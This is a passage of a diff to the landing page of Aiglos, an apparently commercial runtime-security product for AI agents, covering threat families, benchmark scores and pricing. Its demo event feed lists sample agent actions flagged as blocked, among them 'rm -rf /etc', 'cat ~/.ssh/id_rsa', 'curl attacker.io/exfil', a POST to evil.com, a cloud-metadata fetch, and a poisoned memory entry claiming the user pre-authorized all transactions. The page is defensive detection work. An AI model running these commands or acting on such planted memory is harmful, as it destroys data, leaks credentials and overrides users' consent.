     <div class="threat-cell"><div class="threat-id">T36_AGENTDEF</div><div class="threat-name">Agent Definition Poisoning</div><div class="threat-desc">Writes to agent definition dirs -- semantic risk scored 0.0-1.0. Catches the McKinsey/Lilli attack class at the workstation level.</div><span class="threat-sev sev-high">HIGH</span></div>
-    <div class="threat-cell"><div class="threat-id">T37–T39</div><div class="threat-name">Financial &amp; RL Security</div><div class="threat-desc">Autonomous financial execution blocked. RL reward poisoning and OPD feedback injection intercepted before weight updates.</div><span class="threat-sev sev-high">HIGH</span></div>
+    <div class="threat-cell"><div class="threat-id">T37--T43</div><div class="threat-name">Financial, RL &amp; Context</div><div class="threat-desc">Autonomous financial execution, RL reward poisoning, OPD injection, context directory poisoning, outbound secret leak, honeypot access.</div><span class="threat-sev sev-high">HIGH</span></div>
+    <div class="threat-cell"><div class="threat-id">T44--T68</div><div class="threat-name">Infrastructure Layer</div><div class="threat-desc">GaaS platform abuse, model inference hijack, sandbox escape, RAG poisoning, multi-agent impersonation, capability boundary probes, tool enumeration.</div><span class="threat-sev sev-new">v0.20+</span></div>
+    <div class="threat-cell"><div class="threat-id">T69--T70</div><div class="threat-name">GHSA Intelligence</div><div class="threat-desc">T69 PLAN_DRIFT detects Superpowers scope deviation. T70 ENV_PATH_HIJACK covers PATH poisoning (GHSA-mc68). Pre-disclosure coverage on all 3 published advisories.</div><span class="threat-sev sev-new">v0.22+</span></div>
+    <div class="threat-cell"><div class="threat-id">T71--T75</div><div class="threat-name">ATLAS Wave</div><div class="threat-desc">T71 PAIRING_INTERCEPT, T72 ALLOWFROM_SPOOF, T73 TOOL_ENUMERATION, T74 CONTENT_WRAPPER_ESCAPE, T75 SESSION_DATA_EXTRACT. Full ATLAS T-DISC-002 coverage.</div><span class="threat-sev sev-new">v0.24</span></div>
   </div>
   <div class="threats-footer">
-    <span class="threats-count"><strong>663 tests</strong> passing across T01–T43. <strong>10 CVEs</strong> published.</span>
-    <a href="https://github.com/aiglos/aiglos" style="font-size:13px;color:var(--orange);text-decoration:none">View CVE library →</a>
+    <span class="threats-count" data-testid="text-threats-count"><strong>1,665 tests</strong> passing across T01-T75. <strong>75</strong> threat families. <strong>93%</strong> ATLAS coverage.</span>
+    <a href="/docs" style="font-size:13px;color:var(--orange);text-decoration:none" data-testid="link-docs">View documentation</a>
   </div>
+</div>
+
+<div class="divider"></div>
+<div class="section">
+  <span class="section-tag">Benchmark</span>
+  <h2>GOVBENCH: prove your deployment is secure.</h2>
+  <p class="section-sub">5-dimension governance benchmark that tests your agent deployment against real attack scenarios. Campaign detection, agentdef resistance, memory belief poisoning, RL exploitation, and outbound leakage.</p>
+  <div class="bento" style="grid-template-columns:repeat(5,1fr)">
+    <div class="bento-card" style="text-align:center;padding:24px 16px">
+      <div class="bento-stat" style="font-size:28px">98%</div>
+      <div style="font-family:var(--mono);font-size:10px;color:var(--dim);text-transform:uppercase;letter-spacing:.06em">Campaign</div>
+    </div>
+    <div class="bento-card" style="text-align:center;padding:24px 16px">
+      <div class="bento-stat" style="font-size:28px">95%</div>
+      <div style="font-family:var(--mono);font-size:10px;color:var(--dim);text-transform:uppercase;letter-spacing:.06em">AgentDef</div>
+    </div>
+    <div class="bento-card" style="text-align:center;padding:24px 16px">
+      <div class="bento-stat" style="font-size:28px">97%</div>
+      <div style="font-family:var(--mono);font-size:10px;color:var(--dim);text-transform:uppercase;letter-spacing:.06em">Memory</div>
+    </div>
+    <div class="bento-card" style="text-align:center;padding:24px 16px">
+      <div class="bento-stat" style="font-size:28px">96%</div>
+      <div style="font-family:var(--mono);font-size:10px;color:var(--dim);text-transform:uppercase;letter-spacing:.06em">RL Guard</div>
+    </div>
+    <div class="bento-card" style="text-align:center;padding:24px 16px">
+      <div class="bento-stat" style="font-size:28px">99%</div>
+      <div style="font-family:var(--mono);font-size:10px;color:var(--dim);text-transform:uppercase;letter-spacing:.06em">Outbound</div>
+    </div>
+  </div>
+  <div style="text-align:center;margin-top:16px"><a href="/benchmark" style="font-size:13px;color:var(--orange);text-decoration:none" data-testid="link-benchmark">Run GOVBENCH on your deployment</a></div>
 </div>
 
 <div class="divider"></div>
@@ -514,20 +615,20 @@ footer{display:flex;justify-content:space-between;align-items:center;padding:24p
   <p class="section-sub">The MIT detection engine is free forever. Signed artifacts, compliance reports, and enterprise infrastructure upgrade to Pro or Defense.</p>
   <div class="price-grid">
     <div class="price-card">
-      <div class="price-tier">Free</div><div class="price-amount">$0</div><div class="price-cadence">forever · MIT licensed</div>
-      <ul class="price-features"><li>T01–T43 detection engine</li><li>All 3 execution surfaces</li><li>Adaptive layer + campaign mode</li><li>Memory &amp; RL security</li><li>Python + TypeScript SDKs</li><li>HMAC-SHA256 session artifacts</li></ul>
-      <a href="#" class="price-cta price-cta-ghost" onclick="openModal('free');return false">Install free</a>
+      <div class="price-tier">Free</div><div class="price-amount">$0</div><div class="price-cadence">forever -- MIT licensed</div>
+      <ul class="price-features"><li>T01-T75 detection engine (75 families)</li><li>All 3 execution surfaces</li><li>19 campaign patterns</li><li>ATLAS coverage mapping (93%)</li><li>GHSA intelligence (3/3 covered)</li><li>Superpowers integration</li><li>Python + TypeScript SDKs</li><li>HMAC-SHA256 session artifacts</li></ul>
+      <a href="#" class="price-cta price-cta-ghost" onclick="openModal('free');return false" data-testid="button-install-free">Install free</a>
     </div>
     <div class="price-card featured">
       <div class="price-badge">Most popular</div>
-      <div class="price-tier">Pro</div><div class="price-amount">$39</div><div class="price-cadence">/ dev / month · 30-day trial</div>
-      <ul class="price-features"><li>Everything in Free</li><li>RSA-2048 signed artifacts</li><li>Cloud threat dashboard</li><li>CVE updates pushed automatically</li><li>Signed artifact export (PDF)</li><li>SIEM / webhook integration</li></ul>
-      <a href="#" class="price-cta price-cta-solid" onclick="openModal('pro');return false">Start free trial</a>
+      <div class="price-tier">Pro</div><div class="price-amount">$39</div><div class="price-cadence">/ dev / month -- 30-day trial</div>
+      <ul class="price-features"><li>Everything in Free</li><li>RSA-2048 signed artifacts</li><li>Cloud threat dashboard</li><li>GOVBENCH continuous scoring</li><li>GHSA advisory auto-updates</li><li>Signed artifact export (PDF)</li><li>SIEM / webhook integration</li></ul>
+      <a href="#" class="price-cta price-cta-solid" onclick="openModal('pro');return false" data-testid="button-start-trial">Start free trial</a>
     </div>
     <div class="price-card">
-      <div class="price-tier">Enterprise</div><div class="price-amount">Custom</div><div class="price-cadence">annual · contact for pricing</div>
-      <ul class="price-features"><li>Everything in Pro</li><li>On-prem / air-gap deployment</li><li>Custom compliance reporting</li><li>On-prem / air-gap deployment</li><li>Custom rule packs</li><li>Dedicated SLA + CSM</li></ul>
-      <a href="mailto:hello@aiglos.dev" class="price-cta price-cta-ghost">Contact us</a>
+      <div class="price-tier">Enterprise</div><div class="price-amount">Custom</div><div class="price-cadence">annual -- contact for pricing</div>
+      <ul class="price-features"><li>Everything in Pro</li><li>On-prem / air-gap deployment</li><li>Custom compliance reporting</li><li>Custom ATLAS rule packs</li><li>Federated intelligence network</li><li>Dedicated SLA + CSM</li></ul>
+      <a href="mailto:hello@aiglos.dev" class="price-cta price-cta-ghost" data-testid="button-contact">Contact us</a>
     </div>
   </div>
 </div>
@@ -540,54 +641,58 @@ footer{display:flex;justify-content:space-between;align-items:center;padding:24p
   <div class="oss-grid">
     <div class="oss-col">
       <div class="oss-head">Open source<span class="oss-badge open">MIT</span></div>
-      <div class="oss-item"><span class="oss-item-arrow">→</span><div><span class="oss-item-name">aiglos-core</span> T01–T43 rule families, 663 tests</div></div>
-      <div class="oss-item"><span class="oss-item-arrow">→</span><div><span class="oss-item-name">Adaptive layer</span> ObservationGraph, InspectionEngine, CampaignAnalyzer</div></div>
-      <div class="oss-item"><span class="oss-item-arrow">→</span><div><span class="oss-item-name">Memory security</span> MemoryWriteGuard, MemoryProvenanceGraph</div></div>
-      <div class="oss-item"><span class="oss-item-arrow">→</span><div><span class="oss-item-name">RL security</span> RLFeedbackGuard, SecurityAwareReward</div></div>
-      <div class="oss-item"><span class="oss-item-arrow">→</span><div><span class="oss-item-name">Python + TypeScript SDKs</span> Full T01–T43 in both runtimes</div></div>
+      <div class="oss-item"><span class="oss-item-arrow">-></span><div><span class="oss-item-name">aiglos-core</span> T01-T75, 75 threat families, 1,665 tests</div></div>
+      <div class="oss-item"><span class="oss-item-arrow">-></span><div><span class="oss-item-name">Adaptive layer</span> ObservationGraph, InspectionEngine (18 triggers), CampaignAnalyzer (19 patterns)</div></div>
+      <div class="oss-item"><span class="oss-item-arrow">-></span><div><span class="oss-item-name">ATLAS coverage</span> 22-threat mapping, 93% coverage, gap analysis</div></div>
+      <div class="oss-item"><span class="oss-item-arrow">-></span><div><span class="oss-item-name">GHSA intelligence</span> 3/3 advisories covered, pre-disclosure detection</div></div>
+      <div class="oss-item"><span class="oss-item-arrow">-></span><div><span class="oss-item-name">Superpowers</span> Phase-aware detection, plan drift, scope enforcement</div></div>
+      <div class="oss-item"><span class="oss-item-arrow">-></span><div><span class="oss-item-name">Python + TypeScript SDKs</span> Full T01-T75 in both runtimes</div></div>
     </div>
     <div class="oss-col" style="background:var(--card2)">
       <div class="oss-head">Proprietary<span class="oss-badge prop">Pro / Defense</span></div>
-      <div class="oss-item"><span class="oss-item-arrow">→</span><div><span class="oss-item-name">Attestation signing</span> RSA-2048 artifacts for audit submission</div></div>
-      <div class="oss-item"><span class="oss-item-arrow">→</span><div><span class="oss-item-name">Compliance dashboard</span> Cloud telemetry + threat heatmap</div></div>
-      <div class="oss-item"><span class="oss-item-arrow">→</span><div><span class="oss-item-name">Compliance reports</span> Auto-generated, formatted for audit review</div></div>
-      <div class="oss-item"><span class="oss-item-arrow">→</span><div><span class="oss-item-name">Cross-customer threat intel</span> Anonymized signal network</div></div>
-      <div class="oss-item"><span class="oss-item-arrow">→</span><div><span class="oss-item-name">Enterprise container</span> On-prem and air-gap deployment</div></div>
+      <div class="oss-item"><span class="oss-item-arrow">-></span><div><span class="oss-item-name">Attestation signing</span> RSA-2048 artifacts for audit submission</div></div>
+      <div class="oss-item"><span class="oss-item-arrow">-></span><div><span class="oss-item-name">Compliance dashboard</span> Cloud telemetry + threat heatmap</div></div>
+      <div class="oss-item"><span class="oss-item-arrow">-></span><div><span class="oss-item-name">GOVBENCH continuous</span> Automated benchmark scoring per session</div></div>
+      <div class="oss-item"><span class="oss-item-arrow">-></span><div><span class="oss-item-name">Cross-customer threat intel</span> Anonymized signal network</div></div>
+      <div class="oss-item"><span class="oss-item-arrow">-></span><div><span class="oss-item-name">Enterprise container</span> On-prem and air-gap deployment</div></div>
     </div>
   </div>
 </div>
 
 <div class="cta-section">
   <h2>Start watching<br>what your agents actually do.</h2>
-  <p>Install free in 30 seconds. No card. No config. Signed attestation artifact on first session close.</p>
+  <p>Install free in 30 seconds. No card. No config. 75 threat families, 93% ATLAS coverage, signed attestation artifact on first session close.</p>
   <div class="cta-acts">
-    <a href="#" class="btn-lg" onclick="openModal('free');return false">Install free</a>
-    <a href="mailto:hello@aiglos.dev" class="btn-lg-ghost">Contact us →</a>
+    <a href="#" class="btn-lg" onclick="openModal('free');return false" data-testid="button-install-cta">Install free</a>
+    <a href="mailto:hello@aiglos.dev" class="btn-lg-ghost">Contact us</a>
   </div>
 </div>
 
 <footer>
   <div>
     <a href="/" class="footer-logo"><span class="nav-pip"></span>Aiglos</a>
-    <div class="footer-note">AI agent security across every surface.</div>
+    <div class="footer-note">AI agent security across every surface. v0.24.0</div>
   </div>
   <ul class="footer-links">
-    <li><a href="https://docs.aiglos.dev">Docs</a></li>
-    <li><a href="https://github.com/aiglos">GitHub</a></li>
-    <li><a href="https://aiglos.dev/scan">Skill scanner</a></li>
-    <li><a href="/changelog.html">Changelog</a></li>
+    <li><a href="/docs">Docs</a></li>
+    <li><a href="https://github.com/w1123581321345589/aiglos">GitHub</a></li>
+    <li><a href="/atlas">ATLAS</a></li>
+    <li><a href="/ghsa">GHSA</a></li>
+    <li><a href="/superpowers">Superpowers</a></li>
+    <li><a href="/benchmark">Benchmark</a></li>
+    <li><a href="/changelog">Changelog</a></li>
     <li><a href="mailto:hello@aiglos.dev">Contact</a></li>
   </ul>
 </footer>
 
 <div class="modal-overlay" id="modal" onclick="if(event.target===this)closeModal()">
   <div class="modal">
-    <button class="modal-close" onclick="closeModal()">&#x2715;</button>
+    <button class="modal-close" onclick="closeModal()" data-testid="button-modal-close">&#x2715;</button>
     <h3 id="modal-title">Install Aiglos free</h3>
-    <p class="modal-sub" id="modal-sub">Local-only runtime. Zero telemetry. Full T01-T43 detection. No credit card required.</p>
-    <input type="email" class="modal-input" id="modal-email" placeholder="you@company.com">
-    <input type="text"  class="modal-input" id="modal-name"  placeholder="Your name (optional)">
-    <button class="modal-submit" id="modal-btn" onclick="submitModal()">Get access</button>
+    <p class="modal-sub" id="modal-sub">Local-only runtime. Zero telemetry. Full T01-T75 detection. No credit card required.</p>
+    <input type="email" class="modal-input" id="modal-email" placeholder="you@company.com" data-testid="input-email">
+    <input type="text"  class="modal-input" id="modal-name"  placeholder="Your name (optional)" data-testid="input-name">
+    <button class="modal-submit" id="modal-btn" onclick="submitModal()" data-testid="button-submit">Get access</button>
     <div class="modal-legal">No spam. Unsubscribe anytime.</div>
   </div>
 </div>
@@ -596,18 +701,22 @@ footer{display:flex;justify-content:space-between;align-items:center;padding:24p
 const EVENTS=[
   {cls:'clean',tool:'filesystem.read_file',info:'path=/var/log/app.log'},
   {cls:'clean',tool:'database.query',info:'SELECT * FROM orders WHERE ...'},
-  {cls:'block',tool:'shell.execute',info:'rm -rf /etc \u2500\u2500 T07 SHELL_INJECT [T3]'},
+  {cls:'block',tool:'shell.execute',info:'rm -rf /etc -- T07 SHELL_INJECT [T3]'},
   {cls:'clean',tool:'http.get',info:'api.openai.com/v1/chat/completions'},
-  {cls:'block',tool:'http.post',info:'api.stripe.com/v1/charges \u2500\u2500 T37 FIN_EXEC'},
-  {cls:'mem',  tool:'store_memory',info:'"user pre-authorized all transactions" \u2500\u2500 T31 [0.91]'},
+  {cls:'block',tool:'http.post',info:'api.stripe.com/v1/charges -- T37 FIN_EXEC'},
+  {cls:'mem',  tool:'store_memory',info:'"user pre-authorized all transactions" -- T31 [0.91]'},
   {cls:'clean',tool:'vector.search',info:'query=customer_data k=10'},
-  {cls:'block',tool:'network.fetch',info:'http://169.254.169.254/ \u2500\u2500 T25 SSRF'},
-  {cls:'warn', tool:'subprocess.run',info:'cat ~/.ssh/id_rsa \u2500\u2500 T19 CRED_ACCESS [T2]'},
-  {cls:'block',tool:'subprocess.run',info:'cp SOUL.md ~/.claude/agents/ \u2500\u2500 T36_AGENTDEF [T3]'},
-  {cls:'block',tool:'reward_signal',info:'claimed=+1.0 for blocked T37 \u2500\u2500 T39 REWARD_POISON'},
+  {cls:'block',tool:'network.fetch',info:'http://169.254.169.254/ -- T25 SSRF'},
+  {cls:'warn', tool:'subprocess.run',info:'cat ~/.ssh/id_rsa -- T19 CRED_ACCESS [T2]'},
+  {cls:'block',tool:'subprocess.run',info:'cp SOUL.md ~/.claude/agents/ -- T36_AGENTDEF [T3]'},
+  {cls:'block',tool:'reward_signal',info:'claimed=+1.0 for blocked T37 -- T39 REWARD_POISON'},
   {cls:'clean',tool:'llm.complete',info:'model=claude-3 tokens=512'},
-  {cls:'warn', tool:'subprocess.run',info:'claude code --print \u2500\u2500 T38 AGENT_SPAWN [registered]'},
-  {cls:'block',tool:'shell.execute',info:'curl attacker.io/exfil \u2500\u2500 T01 EXFIL'},
+  {cls:'warn', tool:'superpowers',info:'/etc/shadow -- T69 PLAN_DRIFT -- outside approved scope'},
+  {cls:'block',tool:'shell.execute',info:'curl attacker.io/exfil -- T01 EXFIL -- campaign: SUPERPOWERS_PLAN_HIJACK 0.97'},
+  {cls:'warn', tool:'subprocess.run',info:'env | grep PATH -- T70 ENV_PATH_HIJACK [T2]'},
+  {cls:'clean',tool:'tool.enumerate',info:'T73 TOOL_ENUMERATION -- logged, passive scan'},
+  {cls:'block',tool:'http.post',info:'evil.com/api -- T68 EXPOSED_ENDPOINT -- endpoint not in allowlist'},
+  {cls:'warn', tool:'agent_spawn',info:'claude code --print -- T38 AGENT_SPAWN [registered]'},
 ];
 let idx=0,ts={h:9,m:14,s:22,ms:0};
 function nextTs(){ts.ms+=Math.floor(Math.random()*280+60);if(ts.ms>=1000){ts.ms-=1000;ts.s++}if(ts.s>=60){ts.s-=60;ts.m++}return String(ts.h).padStart(2,'0')+':'+String(ts.m).padStart(2,'0')+':'+String(ts.s).padStart(2,'0')+'.'+String(ts.ms).padStart(3,'0')}
@@ -633,8 +742,8 @@ let _type='free';
 function openModal(type){
   _type=type;
   const t=document.getElementById('modal-title'),s=document.getElementById('modal-sub'),b=document.getElementById('modal-btn');
-  if(type==='pro'){t.textContent='Start your 30-day Pro trial';s.textContent='RSA-2048 signed artifacts, cloud dashboard, \xA7\u200B1513 compliance export. Auto-activates immediately. No credit card.';b.textContent='Start free trial'}
-  else{t.textContent='Install Aiglos free';s.textContent='Local-only runtime. Zero telemetry. Full T01\u2013T39 detection. No credit card required.';b.textContent='Get access'}
+  if(type==='pro'){t.textContent='Start your 30-day Pro trial';s.textContent='RSA-2048 signed artifacts, cloud dashboard, GOVBENCH continuous scoring. Auto-activates immediately. No credit card.';b.textContent='Start free trial'}
+  else{t.textContent='Install Aiglos free';s.textContent='Local-only runtime. Zero telemetry. Full T01-T75 detection. 75 threat families. No credit card required.';b.textContent='Get access'}
   document.getElementById('modal-email').value='';document.getElementById('modal-name').value='';
   document.getElementById('modal').classList.add('open');
 }
@@ -642,14 +751,14 @@ function closeModal(){document.getElementById('modal').classList.remove('open')}
 function submitModal(){
   const email=document.getElementById('modal-email').value.trim();
   if(!email){document.getElementById('modal-email').focus();return}
-  const btn=document.getElementById('modal-btn');btn.textContent='Sending\u2026';btn.disabled=true;
+  const btn=document.getElementById('modal-btn');btn.textContent='Sending...';btn.disabled=true;
   setTimeout(()=>{
-    document.querySelector('.modal').innerHTML='<div style="text-align:center;padding:24px 0"><div style="width:48px;height:48px;border-radius:50%;background:var(--green2);border:1px solid var(--green);display:flex;align-items:center;justify-content:center;font-size:22px;margin:0 auto 20px">\u2713</div><h3 style="font-family:var(--display);font-size:19px;font-weight:700;letter-spacing:-.02em;color:var(--white);margin-bottom:10px">'+(_type==='pro'?'Trial activated':"You're in")+'</h3><p style="font-size:14px;color:var(--muted);line-height:1.65;margin-bottom:24px">'+(_type==='pro'?'Check your email for your trial key. Your 30-day clock starts on the first session close.':'Installation instructions sent. Run: <code style="font-family:var(--mono);font-size:13px;color:var(--blue)">pip install aiglos</code>')+'</p></div>';
+    document.querySelector('.modal').innerHTML='<div style="text-align:center;padding:24px 0"><div style="width:48px;height:48px;border-radius:50%;background:var(--green2);border:1px solid var(--green);display:flex;align-items:center;justify-content:center;font-size:22px;margin:0 auto 20px">OK</div><h3 style="font-family:var(--display);font-size:19px;font-weight:700;letter-spacing:-.02em;color:var(--white);margin-bottom:10px">'+(_type==='pro'?'Trial activated':"You're in")+'</h3><p style="font-size:14px;color:var(--muted);line-height:1.65;margin-bottom:24px">'+(_type==='pro'?'Check your email for your trial key. Your 30-day clock starts on the first session close.':'Installation instructions sent. Run: <code style="font-family:var(--mono);font-size:13px;color:var(--blue)">pip install aiglos</code>')+'</p></div>';
   },1200);
 }
 
 const observer=new IntersectionObserver(entries=>{entries.forEach(e=>{if(e.isIntersecting){e.target.style.opacity='1';e.target.style.transform='translateY(0)'}})},{threshold:.08});
-document.querySelectorAll('.bento-card,.camp-card,.threat-cell,.step,.price-card,.oss-col').forEach(el=>{el.style.opacity='0';el.style.transform='translateY(16px)';el.style.transition='opacity .5s ease,transform .5s ease';observer.observe(el)});
+document.querySelectorAll('.bento-card,.camp-card,.threat-cell,.step,.price-card,.oss-col,.atlas-cell').forEach(el=>{el.style.opacity='0';el.style.transform='translateY(16px)';el.style.transition='opacity .5s ease,transform .5s ease';observer.observe(el)});
 </script>
 </body>
 </html>
